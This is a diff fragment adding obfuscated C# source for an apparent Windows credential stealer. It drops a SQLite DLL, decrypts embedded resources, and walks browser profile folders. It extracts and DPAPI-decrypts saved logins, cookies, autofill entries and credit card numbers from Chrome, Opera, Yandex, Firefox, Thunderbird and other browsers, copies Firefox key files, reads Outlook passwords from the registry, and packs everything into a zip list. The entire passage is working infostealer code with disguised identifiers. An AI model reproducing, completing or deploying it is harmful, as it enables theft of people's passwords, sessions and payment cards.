+                FileStream TRON_s20 = new FileStream(TRON_programdata + "\\[sqlitename].dll", FileMode.Create);
+                TRON_s20.Write(TRON_s18, 0, TRON_s18.Length);
+                TRON_s20.Write(TRON_s19, 0, TRON_s19.Length);
+                TRON_s20.Close();
+            }
+            catch
+            { }
+        }
+
+        static byte[] TRON_loadassembly(object TRON_s8)
+        {
+            System.Reflection.Assembly TRON_s5 = System.Reflection.Assembly.GetExecutingAssembly();
+            using (Stream TRON_s7 = TRON_s5.GetManifestResourceStream((string)TRON_s8))
+            {
+                byte[] TRON_s6 = new byte[TRON_s7.Length];
+                TRON_s7.Read(TRON_s6, 0, TRON_s6.Length);
+                return TRON_s6;
+            }
+        }
+
+        static byte[] TRON_decompress(byte[] TRON_s10)
+        {
+            using (MemoryStream TRON_s12 = new MemoryStream(TRON_s10))
+            {
+                byte[] TRON_s13 = new byte[4];
+                TRON_s12.Read(TRON_s13, 0, 4);
+                int TRON_s11 = BitConverter.ToInt32(TRON_s13, 0);
+                using (System.IO.Compression.GZipStream TRON_s8 = new System.IO.Compression.GZipStream(TRON_s12,
+                    System.IO.Compression.CompressionMode.Decompress))
+                {
+                    byte[] result = new byte[TRON_s11];
+                    TRON_s8.Read(result, 0, TRON_s11);
+                    return result;
+                }
+            }
+        }
+
+        static byte[] TRON_decrypt(object TRON_s7, byte[] TRON_s8)
+        {
+            System.Security.Cryptography.SymmetricAlgorithm TRON_s9 = System.Security.Cryptography.Rijndael.Create();
+            System.Security.Cryptography.ICryptoTransform TRON_s10 = TRON_s9.CreateDecryptor(new System.Security.Cryptography.PasswordDeriveBytes((string)TRON_s7, null).GetBytes(16), new byte[16]);
+            MemoryStream TRON_s11 = new MemoryStream();
+            System.Security.Cryptography.CryptoStream TRON_s12 = new System.Security.Cryptography.CryptoStream(TRON_s11, TRON_s10, System.Security.Cryptography.CryptoStreamMode.Write);
+            TRON_s12.Write(TRON_s8, 0, TRON_s8.Length);
+            TRON_s12.FlushFinalBlock();
+            return TRON_s11.ToArray();
+
+        }
+
+        public static object TRON_dcr(object TRON_input)
+        {
+            return Encoding.UTF8.GetString(TRON_s24(TRON_data((string)TRON_input)));
+        }
+
+        public static byte[] TRON_s24(object TRON_s1)
+        {
+            string TRON_s2 = TRON_s1.ToString().TrimEnd('=').ToUpper().ToCharArray().Select(c => Convert.ToString(TRON_chars.Split('z')[1].IndexOf(c), 2).PadLeft(5, '0')).Aggregate((a, b) => a + b);
+            return Enumerable.Range(0, TRON_s2.Length / 8).Select(i => Convert.ToByte(TRON_s2.Substring(i * 8, 8), 2)).ToArray();
+        }
+
+        static object TRON_data(object TRON_s3)
+        {
+            return TRON_s3.ToString().Remove(Convert.ToInt32(Encoding.UTF8.GetString(Convert.FromBase64String("MA=="))), 1);
+        }
+
+        // Обертки функций
+        public static void TRON_Copy(object TRON_s1, object TRON_s2, object TRON_s3)
+        {
+            try
+            {
+                File.Copy((string)TRON_s1, (string)TRON_s2, (bool)TRON_s3);
+
+            }
+            catch { }
+        }
+
+        public static bool TRON_FExist(object TRON_s1)
+        {
+            return File.Exists((string)TRON_s1);
+        }
+
+        public static bool TRON_DExist(object TRON_s1)
+        {
+            return Directory.Exists((string)TRON_s1);
+        }
+
+        public static void TRON_CreateDir(object TRON_s1)
+        {
+            try
+            {
+                Directory.CreateDirectory((string)TRON_s1);
+            }
+            catch { }
+        }
+
+        public static void TRON_DeleteDir(object TRON_s1)
+        {
+            try
+            {
+                Directory.Delete((string)TRON_s1, true);
+            }
+            catch { }
+        }
+
+        public static byte[] TRON_ReadBytes(object TRON_path)
+        {
+            try
+            {
+                return Encoding.UTF8.GetBytes(File.ReadAllText((string)TRON_path, Encoding.UTF8));
+            }
+            catch
+            { }
+
+            return null;
+        }
+
+        public static object TRON_FileName(object TRON_path)
+        {
+            try
+            {
+                return new FileInfo((string)TRON_path).Name;
+            }
+            catch
+            { }
+
+            return "null";
+        }
+
+        public static object TRON_DirName(object TRON_path)
+        {
+            try
+            {
+                return new DirectoryInfo((string)TRON_path).Name;
+            }
+            catch
+            { }
+
+            return "null";
+        }
+        
+        
+        public static object TRON_DirMatch(object TRON_path)
+        {
+            return Regex.Split((string)TRON_path, "(Local|Roaming)")[2].Split('\\')[1];
+        }
+        
+		// Рекурсивный поиск файлов
+        public static List<string> TRON_GetFiles(object TRON_path, string[] TRON_pattern, bool TRON_recursive, string size)
+        {
+            List<string> TRON_files = new List<string>();
+
+            try
+            {
+                if ((string)TRON_path != TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Microsoft"
+                    && (string)TRON_path != TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\Microsoft"
+                    && (string)TRON_path != TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\Application Data"
+                    && (string)TRON_path != TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\History"
+                    && (string)TRON_path != TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\Temporary Internet Files"
+                    && (string)TRON_path != TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\VirtualStore"
+                    && (string)TRON_path != (string)TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir)
+                {
+                    for (int TRON_i = 0; TRON_i < TRON_pattern.Length; TRON_i++)
+                    {
+                        try
+                        {
+                            string[] TRON_files2 = Directory.GetFiles((string)TRON_path, TRON_pattern[TRON_i], SearchOption.TopDirectoryOnly);
+
+                            if (size == "none")
+                                TRON_files.AddRange(TRON_files2);
+                            else
+                                foreach (var item in TRON_files2)
+                                    if (new FileInfo(item).Length / 1024 <= Convert.ToInt16(size))
+                                        TRON_files.Add(item);
+
+                        }
+                        catch
+                        { }
+                    }
+
+                    if (TRON_recursive)
+                        foreach (object TRON_directory in Directory.GetDirectories((string)TRON_path))
+                            TRON_files.AddRange(TRON_GetFiles(TRON_directory.ToString(), TRON_pattern, TRON_recursive, size));
+                }
+
+            }
+            catch
+            { }
+
+            return TRON_files;
+        }
+
+        public static string TRON_XORCipher(string TRON_data, string TRON_key)
+        {
+            int TRON_dataLen = TRON_data.Length;
+            int TRON_keyLen = TRON_key.Length;
+            char[] TRON_output = new char[TRON_dataLen];
+
+            for (int i = 0; i < TRON_dataLen; ++i)
+            {
+                TRON_output[i] = (char)(TRON_data[i] ^ TRON_key[i % TRON_keyLen]);
+            }
+
+            return new string(TRON_output);
+        }
+
+
+        public static object TRON_GetRegKey(string TRON_path, string TRON_name)
+        {
+            object TRON_val = null;
+
+            try
+            {
+                Microsoft.Win32.RegistryKey TRON_reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(TRON_path, false);
+                TRON_val = TRON_reg.GetValue(TRON_name);
+                TRON_reg.Close();
+            }
+            catch
+            { }
+
+            return TRON_val;
+        }
+
+        public static string TRON_OutlookDecryptPwd(byte[] TRON_data)
+        {
+            try
+            {
+                byte[] TRON_decdata = new byte[TRON_data.Length - 1];
+                Buffer.BlockCopy(TRON_data, 1, TRON_decdata, 0, TRON_data.Length - 1);
+
+                return Encoding.UTF8.GetString(System.Security.Cryptography.ProtectedData.Unprotect(TRON_decdata, null, System.Security.Cryptography.DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
+
+            }
+            catch
+            { }
+
+            return "null";
+        }
+
+        public static string TRON_OutlookRecursiveReg(string TRON_path, string[] TRON_keys)
+        {
+            Regex TRON_smtp = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");
+            Regex TRON_mail = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");
+
+            string TRON_data = null;
+
+            try
+            {
+                for (int i = 0; i < TRON_keys.Length; i++)
+                {
+                    try
+                    {
+                        object TRON_val = TRON_GetRegKey(TRON_path, TRON_keys[i]);
+
+                        if (TRON_val != null && TRON_keys[i].Contains("Password") && !TRON_keys[i].Contains("2"))
+                        {
+                            TRON_data += (TRON_keys[i] + ": " + TRON_OutlookDecryptPwd((byte[])TRON_val)) + "\n";
+
+                        }
+                        else if (TRON_val != null)
+                        {
+                            if (TRON_smtp.IsMatch(TRON_val.ToString()) || TRON_mail.IsMatch(TRON_val.ToString()))
+                                TRON_data += (TRON_keys[i] + ": " + TRON_val.ToString()) + "\n";
+                            else
+                                TRON_data += (TRON_keys[i] + ": " + Encoding.UTF8.GetString((byte[])TRON_val).Replace(Convert.ToChar(0).ToString(), "")) + "\n";
+
+
+                        }
+
+                    }
+                    catch
+                    { }
+                }
+
+
+
+                Microsoft.Win32.RegistryKey TRON_reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(TRON_path, false);
+                string[] TRON_regkeys = TRON_reg.GetSubKeyNames();
+                for (int k = 0; k < TRON_regkeys.Length; k++)
+                {
+                    try
+                    {
+                        TRON_data += (TRON_OutlookRecursiveReg(TRON_path + "\\" + TRON_regkeys[k], TRON_keys)) + "\n";
+                    }
+                    catch
+                    { }
+                }
+
+            }
+            catch
+            { }
+
+            return TRON_data;
+        }
+    }
+
+    struct TRON_Chrome
+    {
+        public object TRON_Chrome1;
+        public object TRON_Chrome2;
+        public object TRON_Chrome3;
+        public object TRON_Chrome4;
+    }
+
+    struct TRON_Gecko
+    {
+        public object TRON_Gecko1;
+        public object TRON_Gecko2;
+        public object TRON_Gecko3;
+    }
+
+    class TRON_Browsers
+    {
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool SetDllDirectory(string lpPathName);
+
+        [DllImport("[sqlitename]", EntryPoint = "sqlite3_open_v2", CallingConvention = CallingConvention.Cdecl)]
+        private static extern int TRON_s10(byte[] filename, out IntPtr db, int flags, IntPtr zvfs);
+        [DllImport("[sqlitename]", EntryPoint = "sqlite3_prepare_v2", CallingConvention = CallingConvention.Cdecl)]
+        private static extern int TRON_s11(IntPtr db, [MarshalAs(UnmanagedType.LPStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
+        [DllImport("[sqlitename]", EntryPoint = "sqlite3_finalize", CallingConvention = CallingConvention.Cdecl)]
+        private static extern int TRON_s12(IntPtr stmt);
+        [DllImport("[sqlitename]", EntryPoint = "sqlite3_column_text", CallingConvention = CallingConvention.Cdecl)]
+        private static extern IntPtr TRON_s13(IntPtr stmt, int index);
+        [DllImport("[sqlitename]", EntryPoint = "sqlite3_close", CallingConvention = CallingConvention.Cdecl)]
+        private static extern int TRON_s14(IntPtr db);
+        [DllImport("[sqlitename]", EntryPoint = "sqlite3_step", CallingConvention = CallingConvention.Cdecl)]
+        private static extern int TRON_s15(IntPtr stmt);
+
+        // Статические пути сбора файлов
+        private static string[] TRON_crome_browsers = new string[]
+        {
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\Google\\Chrome\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Opera Software\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Kometa\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Orbitum\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Comodo\\Dragon\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Amigo\\User\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Torch\\User Data\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Yandex\\YandexBrowser\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Vivaldi\\",
+                TRONRANDOM_NAME.TRON_Helper.TRON_localappdata  + "\\Sputnik\\"
+        };
+
+        private static string[] TRON_gecko_browsers = new string[]
+        {
+             TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Mozilla\\Firefox\\Profiles\\",
+             TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Waterfox\\Profiles\\",
+             TRONRANDOM_NAME.TRON_Helper.TRON_appdata + "\\Thunderbird\\Profiles\\"
+
+
+        };
+
+
+        public static void TRON_s7(object TRON_recursive)
+        {
+            try
+            {
+                TRONRANDOM_NAME.TRON_Helper.TRON_CreateDir(TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir);
+
+                SetDllDirectory(TRONRANDOM_NAME.TRON_Helper.TRON_programdata);
+
+                // В зависимости от метода сбора стартуем соответствующие потоки
+                if ((bool)TRON_recursive)
+                {
+                    string[] TRON_paths = { TRONRANDOM_NAME.TRON_Helper.TRON_localappdata, TRONRANDOM_NAME.TRON_Helper.TRON_appdata };
+
+                    for (int i = 0; i < TRON_paths.Length; i++)
+                    {
+                        Thread TRON_th = new Thread(new ParameterizedThreadStart(TRON_s9));
+                        TRON_th.Start(TRON_paths[i]);
+
+                        Thread TRON_th2 = new Thread(new ParameterizedThreadStart(TRON_s8));
+                        TRON_th2.Start(TRON_paths[i]);
+
+                        TRON_th.Join();
+                        TRON_th2.Join();
+                    }
+                }
+                else
+                {
+                    for (int i = 0; i < TRON_crome_browsers.Length; i++)
+                    {
+                        Thread TRON_th = new Thread(new ParameterizedThreadStart(TRON_s9));
+                        TRON_th.Start(TRON_crome_browsers[i]);
+                        TRON_th.Join();
+                    }
+
+                    for (int i = 0; i < TRON_gecko_browsers.Length; i++)
+                    {
+                        Thread TRON_th2 = new Thread(new ParameterizedThreadStart(TRON_s8));
+                        TRON_th2.Start(TRON_gecko_browsers[i]);
+                        TRON_th2.Join();
+                    }
+
+                }
+
+
+                TRONRANDOM_NAME.TRON_Helper.TRON_DeleteDir(TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir);
+            }
+            catch
+            { }
+
+        }
+
+        static void TRON_s8(object TRON_s13)
+        {
+            foreach (var item in TRONRANDOM_NAME.TRON_Helper.TRON_GetFiles(TRON_s13, new string[] { "cookies.sqlite", "formhistory.sqlite", "key3.db", "key4.db", "logins.json" }, true, "none"))
+            {
+                if ((string)TRONRANDOM_NAME.TRON_Helper.TRON_FileName(item) == "cookies.sqlite")
+                    TRON_GetGeckoCookies(item);
+                else if ((string)TRONRANDOM_NAME.TRON_Helper.TRON_FileName(item) == "formhistory.sqlite")
+                    TRON_GetGeckoForms(item);
+                else if ((string)TRONRANDOM_NAME.TRON_Helper.TRON_FileName(item) == "key3.db")
+                    TRON_GetGeckoPasswords(item);
+                else if ((string)TRONRANDOM_NAME.TRON_Helper.TRON_FileName(item) == "key4.db")
+                    TRON_GetGeckoPasswords(item);
+                else if ((string)TRONRANDOM_NAME.TRON_Helper.TRON_FileName(item) == "logins.json")
+                    TRON_GetGeckoPasswords(item);
+
+
+            }
+        }
+
+        static void TRON_GetGeckoCookies(object TRON_path)
+        {
+
+            if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_path))
+            {
+                object TRON_s6 = Path.Combine((string)TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir, Path.GetRandomFileName());
+
+                try
+                {
+                    TRONRANDOM_NAME.TRON_Helper.TRON_Copy(TRON_path, TRON_s6, true);
+                    string TRON_data = null;
+                    IntPtr TRON_s1, TRON_s2 = IntPtr.Zero;
+
+                    try
+                    {
+                        if (TRON_s10(Encoding.UTF8.GetBytes((string)TRON_s6), out TRON_s1, 1, IntPtr.Zero) == 0)
+                        {
+                            if (TRON_s11(TRON_s1, "SELECT * FROM moz_cookies", 26, out TRON_s2, IntPtr.Zero) == 0)
+                            {
+                                for (int i = 0; TRON_s15(TRON_s2) == 100; i++)
+                                {
+                                    TRON_data += (Marshal.PtrToStringAnsi(TRON_s13(TRON_s2, 5)) + "\tTRUE\t"
+                                            + Marshal.PtrToStringAnsi(TRON_s13(TRON_s2, 6)) + "\tFALSE\t"
+                                            + Marshal.PtrToStringAnsi(TRON_s13(TRON_s2, 7)) + "\t"
+                                            + Marshal.PtrToStringAnsi(TRON_s13(TRON_s2, 3)) + "\t"
+                                            + Marshal.PtrToStringAnsi(TRON_s13(TRON_s2, 4)) + "\n");
+                                }
+                                TRON_s12(TRON_s2);
+                            }
+                            TRON_s14(TRON_s1);
+                        }
+                    }
+                    catch
+                    {
+                    }
+
+
+                    TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Browsers\\Cookies\\" + (TRON_Helper.TRON_DirMatch(TRON_path).ToString().Length > 2 ? TRON_Helper.TRON_DirMatch(TRON_path).ToString().Replace(" ", "_") : "Unknown") + "_Cookies___" + Path.GetRandomFileName().Split('.')[1] + ".txt", Encoding.UTF8.GetBytes(TRON_data));
+                }
+                catch
+                { }
+
+            }
+
+        }
+
+        static void TRON_GetGeckoForms(object TRON_path)
+        {
+            if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_path))
+            {
+                object TRON_s6 = Path.Combine((string)TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir, Path.GetRandomFileName());
+                try
+                {
+                    TRONRANDOM_NAME.TRON_Helper.TRON_Copy(TRON_path, TRON_s6, true);
+                    string TRON_data = null;
+                    IntPtr TRON_s1, TRON_s2 = IntPtr.Zero;
+
+                    try
+                    {
+                        if (TRON_s10(Encoding.UTF8.GetBytes((string)TRON_s6), out TRON_s1, 1, IntPtr.Zero) == 0)
+                        {
+                            if (TRON_s11(TRON_s1, "SELECT * FROM moz_formhistory", 29, out TRON_s2, IntPtr.Zero) == 0)
+                            {
+                                for (int i = 0; TRON_s15(TRON_s2) == 100; i++)
+                                {
+                                    TRON_data += (Marshal.PtrToStringAnsi(TRON_s13(TRON_s2, 1)) + "\t"
+                                            + Marshal.PtrToStringAnsi(TRON_s13(TRON_s2, 2)) + "\n");
+                                }
+                                TRON_s12(TRON_s2);
+                            }
+                            TRON_s14(TRON_s1);
+                        }
+                    }
+                    catch
+                    {
+                    }
+
+                    TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Browsers\\Forms\\" + (TRON_Helper.TRON_DirMatch(TRON_path).ToString().Length > 2 ? TRON_Helper.TRON_DirMatch(TRON_path).ToString().Replace(" ", "_") : "Unknown") + "_Forms___" + Path.GetRandomFileName().Split('.')[1] + ".txt", Encoding.UTF8.GetBytes(TRON_data));
+                }
+                catch
+                { }
+
+            }
+        }
+
+        static void TRON_GetGeckoPasswords(object TRON_path)
+        {
+
+            if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_path))
+            {
+                try
+                {
+                    string TRON_brname = TRON_Helper.TRON_DirMatch(TRON_path).ToString().Length > 2 ? TRON_Helper.TRON_DirMatch(TRON_path.ToString()).ToString().Replace(" ", "_") : "Unknown";
+
+                    File.Copy(TRON_path.ToString(), TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir + "\\" + TRON_brname + "_" + new DirectoryInfo(TRON_path.ToString()).Parent + "_" + TRON_Helper.TRON_FileName(TRON_path.ToString()), true);
+                    TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Browsers\\" + TRON_brname + "_passdata\\" + new DirectoryInfo(TRON_path.ToString()).Parent + "\\" + TRONRANDOM_NAME.TRON_Helper.TRON_FileName(TRON_path.ToString()), TRONRANDOM_NAME.TRON_Helper.TRON_ReadBytes(TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir + "\\" + TRON_brname + "_" + new DirectoryInfo(TRON_path.ToString()).Parent + "_" + TRON_Helper.TRON_FileName(TRON_path.ToString())));
+
+                    File.Delete(TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir + "\\" + TRON_brname + "_" + TRON_Helper.TRON_DirName(TRON_path.ToString()) + "_" + TRON_Helper.TRON_FileName(TRON_path.ToString()));
+                }
+                catch
+                { }
+
+            }
+        }
+
+        static void TRON_s9(object TRON_s13)
+        {
+            foreach (var item in TRONRANDOM_NAME.TRON_Helper.TRON_GetFiles(TRON_s13, new string[] { "Login Data", "Cookies", "Web Data" }, true, "none"))
+            {
+                try
+                {
+                    string TRON_info = (string)TRONRANDOM_NAME.TRON_Helper.TRON_FileName(item);
+
+                    if (TRON_info == "Login Data")
+                        TRON_GetChromiumLogins(item);
+                    else if (TRON_info == "Cookies")
+                        TRON_GetChromiumCookies(item);
+                    else
+                        TRON_GetChromiumWebData(item);
+                }
+                catch
+                {
+                }
+
+
+            }
+
+
+        }
+
+        static void TRON_GetChromiumLogins(object TRON_path)
+        {
+            if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_path))
+            {
+                object TRON_s7 = Path.Combine((string)TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir, Path.GetRandomFileName());
+                try
+                {
+                    TRONRANDOM_NAME.TRON_Helper.TRON_Copy(TRON_path, TRON_s7, true);
+                    string TRON_data = null;
+
+                    IntPtr TRON_s2, TRON_s3 = IntPtr.Zero;
+
+                    if (TRON_s10(Encoding.UTF8.GetBytes((string)TRON_s7), out TRON_s2, 1, IntPtr.Zero) == 0)
+                    {
+                        if (TRON_s11(TRON_s2, "SELECT * FROM logins", 24, out TRON_s3, IntPtr.Zero) == 0)
+                        {
+                            for (int i = 0; TRON_s15(TRON_s3) == 100; i++)
+                            {
+                                try
+                                {
+                                    byte[] buff = new byte[1024];
+                                    Marshal.Copy((IntPtr)TRON_s13(TRON_s3, 5), buff, 0, buff.Length);
+                                    byte[] decrypted = System.Security.Cryptography.ProtectedData.Unprotect(buff, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
+
+                                    if (Marshal.PtrToStringAnsi(TRON_s13(TRON_s3, 3)).Length > 1)
+                                        TRON_data += Marshal.PtrToStringAnsi(TRON_s13(TRON_s3, 0)) + " | "
+                                            + Marshal.PtrToStringAnsi(TRON_s13(TRON_s3, 3)) + " | "
+                                            + Encoding.UTF8.GetString(decrypted) + "\n";
+                                }
+                                catch
+                                { }
+                            }
+                            TRON_s12(TRON_s3);
+                        }
+                        TRON_s14(TRON_s2);
+                    }
+
+
+                    if (TRON_data.Length > 0)
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Browsers\\" + (TRON_Helper.TRON_DirMatch(TRON_path).ToString().Length > 2 ? TRON_Helper.TRON_DirMatch(TRON_path).ToString().Replace(" ", "_") : "Unknown") + "_Passwords___" + Path.GetRandomFileName().Split('.')[1] + ".txt", Encoding.UTF8.GetBytes(TRON_data));
+
+
+                }
+                catch
+                {
+                }
+            }
+        }
+
+        static void TRON_GetChromiumCookies(object TRON_path)
+        {
+            if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_path))
+            {
+                object TRON_s7 = Path.Combine((string)TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir, Path.GetRandomFileName());
+                try
+                {
+                    TRONRANDOM_NAME.TRON_Helper.TRON_Copy(TRON_path, TRON_s7, true);
+                    string TRON_data = null;
+                    IntPtr TRON_hDB, TRON_stmt = IntPtr.Zero;
+
+                    if (TRON_s10(Encoding.UTF8.GetBytes((string)TRON_s7), out TRON_hDB, 1, IntPtr.Zero) == 0)
+                    {
+                        if (TRON_s11(TRON_hDB, "SELECT * FROM cookies", 24, out TRON_stmt, IntPtr.Zero) == 0)
+                        {
+                            for (int i = 0; TRON_s15(TRON_stmt) == 100; i++)
+                            {
+                                try
+                                {
+                                    byte[] buff = new byte[1024];
+                                    Marshal.Copy(TRON_s13(TRON_stmt, 12), buff, 0, buff.Length);
+                                    byte[] decrypted = System.Security.Cryptography.ProtectedData.Unprotect(buff, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
+
+                                    TRON_data += Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 1)) + "\tTRUE\t"
+                                        + Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 4)) + "\t"
+                                        + (Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 6)).Contains("0") ? "FALSE" : "TRUE") + "\t"
+                                        + Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 5)) + "\t"
+                                        + Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 2)) + "\t"
+                                        + Encoding.UTF8.GetString(decrypted) + "\n";
+                                }
+                                catch
+                                {
+
+                                }
+                            }
+                            TRON_s12(TRON_stmt);
+                        }
+                        TRON_s14(TRON_hDB);
+                    }
+
+                    if (TRON_data.Length > 0)
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Browsers\\Cookies\\" + (TRON_Helper.TRON_DirMatch(TRON_path).ToString().Length > 2 ? TRON_Helper.TRON_DirMatch(TRON_path).ToString().Replace(" ", "_") : "Unknown") + "_Cookies___" + Path.GetRandomFileName().Split('.')[1] + ".txt", Encoding.UTF8.GetBytes(TRON_data));
+
+
+                }
+                catch
+                {
+
+                }
+
+            }
+        }
+
+        static void TRON_GetChromiumWebData(object TRON_path)
+        {
+            if (TRONRANDOM_NAME.TRON_Helper.TRON_FExist(TRON_path))
+            {
+                object TRON_s7 = Path.Combine((string)TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_copy_files_dir, Path.GetRandomFileName());
+                try
+                {
+                    TRONRANDOM_NAME.TRON_Helper.TRON_Copy(TRON_path, TRON_s7, true);
+                    string TRON_data = null;
+                    string TRON_data2 = null;
+                    IntPtr TRON_hDB, TRON_stmt = IntPtr.Zero;
+                    if (TRON_s10(Encoding.UTF8.GetBytes((string)TRON_s7), out TRON_hDB, 1, IntPtr.Zero) == 0)
+                    {
+                        if (TRON_s11(TRON_hDB, "SELECT * FROM autofill", 24, out TRON_stmt, IntPtr.Zero) == 0)
+                        {
+                            for (int i = 0; TRON_s15(TRON_stmt) == 100; i++)
+                            {
+                                try
+                                {
+                                    TRON_data += Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 0)) + "\t"
+                                        + Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 1)) + "\n";
+                                }
+                                catch { }
+                            }
+                            TRON_s12(TRON_stmt);
+                        }
+
+                        if (TRON_s11(TRON_hDB, "SELECT * FROM credit_cards", 26, out TRON_stmt, IntPtr.Zero) == 0)
+                        {
+
+                            for (int i = 0; TRON_s15(TRON_stmt) == 100; i++)
+                            {
+                                try
+                                {
+                                    byte[] buff = new byte[1024];
+                                    Marshal.Copy(TRON_s13(TRON_stmt, 4), buff, 0, buff.Length);
+                                    byte[] decrypted = System.Security.Cryptography.ProtectedData.Unprotect(buff, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
+
+                                    TRON_data2 += Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 1)) + " | "
+                                        + Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 2)) + " | "
+                                        + Marshal.PtrToStringAnsi(TRON_s13(TRON_stmt, 3)) + " | "
+                                        + Encoding.UTF8.GetString(decrypted) + "\n";
+                                }
+                                catch
+                                {
+
+                                }
+                            }
+                            TRON_s12(TRON_stmt);
+                        }
+                        TRON_s14(TRON_hDB);
+                    }
+
+
+                    if (TRON_data.Length > 0)
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Browsers\\Forms\\" + (TRON_Helper.TRON_DirMatch(TRON_path).ToString().Length > 2 ? TRON_Helper.TRON_DirMatch(TRON_path).ToString().Replace(" ", "_") : "Unknown") + "_Forms___" + Path.GetRandomFileName().Split('.')[1] + ".txt", Encoding.UTF8.GetBytes(TRON_data));
+
+                    if (TRON_data2.Length > 0)
+                        TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_ziplist.Add("Browsers\\Cards\\" + (TRON_Helper.TRON_DirMatch(TRON_path).ToString().Length > 2 ? TRON_Helper.TRON_DirMatch(TRON_path).ToString().Replace(" ", "_") : "Unknown") + "_Cards___" + Path.GetRandomFileName().Split('.')[1] + ".txt", Encoding.UTF8.GetBytes(TRON_data2));
+
+                }
+                catch
+                {
+
+                }
+
+            }
+        }
+
+    }
+
+}
